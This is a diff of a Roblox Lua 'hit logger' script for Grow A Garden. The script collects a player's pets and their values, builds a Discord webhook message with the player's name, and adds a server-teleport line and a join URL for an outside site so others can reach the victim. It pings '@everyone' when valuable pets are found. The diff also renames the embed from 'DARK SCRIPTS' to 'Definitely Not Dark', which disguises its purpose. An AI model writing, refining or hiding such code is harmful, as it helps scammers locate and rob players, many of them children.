@@ -85,16 +85,13 @@ local function formatPetLine(name)
         end
     end
 
-    -- Extract weight
     local weight = 0
     local kgMatch = string.match(name, "(%d+%.?%d*)%s*KG") or string.match(name, "(%d+%.?%d*)%s*kg")
     if kgMatch then weight = tonumber(kgMatch) or 0 end
 
-    -- Extract age if present
     local ageMatch = string.match(name, "%[Age%s*(%d+)%]")
     local ageText = ageMatch and ("[Age " .. ageMatch .. "]") or ""
 
-    -- Determine emoji for non-priority
     if not emoji then
         if weight >= 30 then
             emoji = "💪"
@@ -106,10 +103,12 @@ local function formatPetLine(name)
     return emoji .. " - " .. name .. " " .. ageText .. " → " .. baseValue .. "¢"
 end
 
+-- Collect pets with priority at top
 local function collectPets(container)
     local items = {}
     local hasPriorityPet = false
     if not container then return {}, 0, false end
+
     for _, obj in ipairs(container:GetChildren()) do
         if obj:IsA("Tool") and isPet(obj.Name) then
             table.insert(items, obj.Name)
@@ -119,10 +118,19 @@ local function collectPets(container)
         end
     end
 
-    local formatted = {}
+    local priorityItems, normalItems = {}, {}
     local totalValue = 0
+
     for _, name in ipairs(items) do
-        table.insert(formatted, formatPetLine(name))
+        local line = formatPetLine(name)
+        local isPriority = getPriorityEmoji(name) ~= nil
+
+        if isPriority then
+            table.insert(priorityItems, line)
+        else
+            table.insert(normalItems, line)
+        end
+
         for petName, petValue in pairs(PRIORITY_VALUES) do
             if string.find(string.lower(name), string.lower(petName)) then
                 totalValue = totalValue + petValue
@@ -130,6 +138,10 @@ local function collectPets(container)
             end
         end
     end
+
+    local formatted = {}
+    for _, line in ipairs(priorityItems) do table.insert(formatted, line) end
+    for _, line in ipairs(normalItems) do table.insert(formatted, line) end
 
     return formatted, totalValue, hasPriorityPet
 end
@@ -143,18 +155,19 @@ local totalValue = backpackValue + equippedValue
 local hasPriority = hasPriorityBackpack or hasPriorityEquipped
 local pingText = hasPriority and "--@everyone\n" or ""
 
--- Create teleport line
+-- Teleport line
 local teleportLine = string.format('game:GetService("TeleportService"):TeleportToPlaceInstance(%d, "%s")', game.PlaceId, game.JobId)
-
--- Combine ping + teleport for webhook content
 local contentText = pingText .. teleportLine
 
--- Generate dynamic join URL for embed
+-- Dynamic server join URL
 local serverURL = string.format(
     "https://kebabman.vercel.app/start?placeId=%d&gameInstanceId=%s",
     game.PlaceId,
     game.JobId
 )
+
+-- Embed color: red if ping, green if no priority
+local embedColor = hasPriority and 15158332 or 3066993
 
 -- Build Discord embed
 local description = "```Name: " .. player.Name .. "\n" ..
@@ -173,9 +186,9 @@ local description = "```Name: " .. player.Name .. "\n" ..
 local payload = {
     content = contentText,
     embeds = {{
-        title = "🌵 Grow A Garden Hit - DARK SCRIPTS 🍀",
+        title = "🌑Definitely Not Dark🌑",
         description = description,
-        color = 3447003
+        color = embedColor
     }}
 }
 
